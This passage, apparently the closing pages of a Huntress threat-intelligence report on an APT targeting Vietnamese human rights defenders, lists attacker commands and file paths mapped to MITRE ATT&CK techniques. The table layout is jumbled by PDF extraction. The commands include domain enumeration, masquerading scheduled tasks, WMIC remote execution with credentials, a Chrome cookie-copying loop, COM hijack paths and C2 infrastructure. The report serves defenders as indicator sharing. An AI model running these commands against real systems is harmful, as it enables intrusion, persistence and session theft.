+cmd.exe /c Windows Management
+C:\Users\Public\Downloads\1.bat T1047: Windows Management Instrumentation to enumerate
+
+Instrumentation processes
+T1057: Process Discovery
+
+T1087.002: Account Discovery:
+Domain Account
+
+net group "Domain Admins" /domain
+T1069.002: Permission Groups
+Discovery: Domain Groups
+
+nltest /dclist:<REDACTED>.local T1018: Remote System Discovery
+
+T1053.005: Scheduled Task/Job:
+Scheduled Task
+
+schtasks /create /sc MINUTE /mo 300
+/tn T1574.002: Hijack Execution Flow: DLL
+"Microsoft\Windows\WindowsColorSy Side-Loading
+stem\Calibration_Update" /tr
+"C:\Users\ T1036.004: Masquerading:
+<REDACTED>\AppData\Roaming\Mic Masquerade Task or Service
+rosoft\SPMigration\Bin\Calibre.exe" /f
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 67/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+T1134.001: Access Token
+cmd.exe /c echo a0e3d8a67d0 > Manipulation: Token
+\.\pipe\a64009 Impersonation/Theft
+
+T1559: Inter-Process Communication
+
+wmic /node:<REDACTED> /user:
+<REDACTED> /password:<REDACTED> T1047: Windows Management
+process call create "cmd.exe /c start Instrumentation
+c:\Users\ T1078.002: Valid Accounts: Domain
+<REDACTED>\AppData\Roaming\Mic Accounts
+rosoft\SPMigration\Bin\calibre.exe"
+
+cmd /c shutdown /r /m \\
+<REDACTED> /t 0 /f T1529: System Shutdown/Reboot
+
+ipconfig /all T1016: System Network Configuration
+Discovery
+
+net view T1135: Network Share Discovery
+
+net use T1021.002: Remote Services:
+SMB/Windows Admin Shares
+
+netstat -ano T1049: System Network Connections
+Discovery
+
+schtasks /create /sc MINUTE /mo 15 T1053.005: Scheduled Task/Job:
+/tn "96d09a49-98ed-4b12-936a- Scheduled Task
+c8715d2d2c0e" /tr "C:\Users\
+<REDACTED>\Appdata\Roaming\Ado
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 68/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+be\bin\javaw.exe -jar C:\Users\ T1036.005: Masquerading: Match
+<REDACTED>\Appdata\Roaming\Ado Legitimate Name or Location
+be\msadobe.jar zfhqq01v" /f
+
+net view \\<REDACTED> /all T1135: Network Share Discovery
+
+T1021.002: Remote Services:
+net use \\<REDACTED> /u: SMB/Windows Admin Shares
+<REDACTED> <REDACTED> T1078.002: Valid Accounts: Domain
+
+Accounts
+
+cmd /c for /f "tokens=*" %G in ('dir /b
+"%localappdata%\Google\Chrome\Us
+er Data\Profile *"') do copy T1555.003: Credentials from Password
+"%localappdata%\Google\Chrome\Us Stores: Credentials from Web Browsers
+er Data%G\Network\Cookies.bak" T1539: Steal Web Session Cookie
+"%localappdata%\Google\Chrome\Us
+er Data%G\Cookies" /y
+
+T1546.015: Event Triggered Execution:
+Component Object Model Hijacking
+T1559.001: Inter-Process
+
+C:\Users\ Communication: Component Object
+<REDACTED>\AppData\Roaming\Mic Model HKU\Software\Classes\WOW6432No
+rosoft\Microsoft Compatibility de\CLSID\{8BCC608C-CE2C-475E-
+Appraiser\{8BCC608C-CE2C-475E- T1036.004: Masquerading: 85CB-
+85CB-AE0EC95EAC64}\cachuri.dll Masquerade Task or Service AE0EC95EAC64}\InProcServer32
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 69/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+T1546.015: Event Triggered Execution:
+Component Object Model Hijacking
+T1559.001: Inter-Process
+
+C:\Users\ Communication: Component Object
+<REDACTED>\AppData\Roaming\Mic Model HKU\Software\Classes\WOW6432No
+rosoft\UpdateLibrary\{1F7CFAF8- de\CLSID\{1F7CFAF8-B558-4EBD-
+B558-4EBD-9526- T1036.004: Masquerading: 9526-203135A79B1D}\InProcServer32
+203135A79B1D}\cachuri.dll Masquerade Task or Service
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+T1546.015: Event Triggered Execution:
+Component Object Model Hijacking
+
+C:\Users\ T1559.001: Inter-Process
+<REDACTED>\AppData\Roaming\Mic Communication: Component Object HKU\Software\Classes\WOW6432No
+rosoft\AD RMS Rights Policy Template Model de\CLSID\{2A918D97-CCFE-4BE6-
+Management (Automated)\ AB0E-
+{2A918D97-CCFE-4BE6-AB0E- T1036.004: Masquerading: D56A2E3F503D}\InProcServer32
+D56A2E3F503D}\cachuri.dll Masquerade Task or Service
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+c:\users\ T1547.001: Boot or Logon Autostart
+<REDACTED>\appdata\roaming\micr Execution: Registry Run Keys / Startup
+osoft\installer\{02594fe8-1152-e41e- Folder DropboxUpdate_{02594FE8-1152-
+a75e- E41E-A75E-923494C7B453}
+923494c7b453}\dropboxupdate.exe T1574.002: Hijack Execution Flow: DLL
+
+Side-Loading
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 70/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+c:\windows\sysnative\gpupdate.exe T1055: Process Injection Cobalt Strike uses a Fork and Run
+method to inject into gpupdate.exe
+
+C:\programdata\adobe\node.exe -e
+require('C:\ProgramData\adobe\1lpio T1218.007: System Binary Proxy
+zkc.node') Execution: JavaScript
+
+T1027.001: Obfuscated Files or
+Information: Binary Padding
+T1129: Shared Modules
+T1027.007: Obfuscated Files or
+
+C:\Users\ Information: Dynamic API Resolution
+<REDACTED>\AppData\Roaming\Mic T1027.013: Obfuscated Files or
+rosoft\UpdateLibrary\{1F7CFAF8- Information: Encrypted/Encoded File
+B558-4EBD-9526-
+203135A79B1D}\iisutil2.dll T1036.004: Masquerading:
+
+Masquerade Task or Service
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+C:\Users\ T1027.003: Obfuscated Files or Masqueraded as a legitimate sdb file
+<REDACTED>\AppData\Roaming\Mic Information: Steganography based solely on extension
+rosoft\Microsoft Compatibility
+Appraiser\{8BCC608C-CE2C-475E- T1036.008: Masquerading:
+85CB- Masquerade File Type
+AE0EC95EAC64}\iisexpressshim.sdb
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic
+rosoft\UpdateLibrary\{1F7CFAF8-
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 71/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+B558-4EBD-9526-
+203135A79B1D}\logo.png
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic T1105: Ingress Tool Transfer
+rosoft\Windows\CloudStore\MSShare T1059.005: Command and Scripting VBS script was used to download files
+
+Point.vbs Interpreter: Visual Basic from remote C2 server over SSH
+
+T1574.002: Hijack Execution Flow: DLL
+Side-Loading
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Wdi T1036.004: Masquerading:
+ServiceHost_339453944\WdiService Masquerade Task or Service
+Host.exe
+
+T1036.005: Masquerading: Match
+Legitimate Name or Location
+
+T1574.002: Hijack Execution Flow: DLL
+C:\ProgramData\Apple\Installer Side-Loading
+Cache\SoftwareUpdate.exe T1036.004: Masquerading:
+
+Masquerade Task or Service
+
+Service: Adobe_Reader T1543.003: Create or Modify System
+Process: Windows Service
+
+T1218.011: System Binary Proxy  launched and executed a
+TpmInit.exe Execution: Rundll32 TpmInit.exe
+
+T1036.005: Masquerading: Match malicious DLL through the use of
+Legitimate Name or Location Rundll32.exe
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 72/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+Infrastructure behind IP addresses
+51.81.29[.]44 T1573.002: Asymmetric Cryptography used by Cobalt Strike leverage TLS
+
+certificates for C2 traffic
+
+51.81.29[.]44
+cdn.arlialter[.]com T1583.004: Acquire Infrastructure:
+fbcn.enantor[.]com Server
+ww1.erabend[.]com T1583.001: Acquire Infrastructure:
+var.alieras[.]com Domains
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 73/73
